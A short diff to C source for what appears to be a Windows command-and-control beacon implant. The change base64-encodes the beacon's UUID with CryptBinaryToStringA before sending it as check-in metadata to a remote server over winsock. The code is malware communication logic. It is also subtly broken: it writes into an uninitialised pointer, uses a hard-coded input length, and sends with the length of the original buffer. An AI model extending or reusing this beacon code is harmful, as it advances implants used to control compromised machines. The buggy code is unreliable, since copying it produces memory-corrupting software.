@@ -4,6 +4,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <rpcdce.h>
+#include <wincrypt.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "rpcrt4.lib")
@@ -46,10 +47,16 @@ void beacon_connect_to_server(char IP[16], int PORT){
     char *sendbuf = stringified_UUID;
     char recvbuf[recvbuflen];
 
+    // base64 encode the UUID of the beacon
+    char b64size[1024];
+    DWORD strcount = _countof(b64size);
+    char *UUID_BUFFER;
+    BOOL res = CryptBinaryToStringA(sendbuf, 128, 1, UUID_BUFFER, &strcount);
+
     //// Send metadata
     printf("\nSENDBUF\n");
-    printf("\n%s\n", sendbuf);
-    send(s, sendbuf, (int)strlen(sendbuf), 0); 
+    printf("\n%s\n", UUID_BUFFER);
+    send(s, UUID_BUFFER, (int)strlen(sendbuf), 0); 
   
     
     
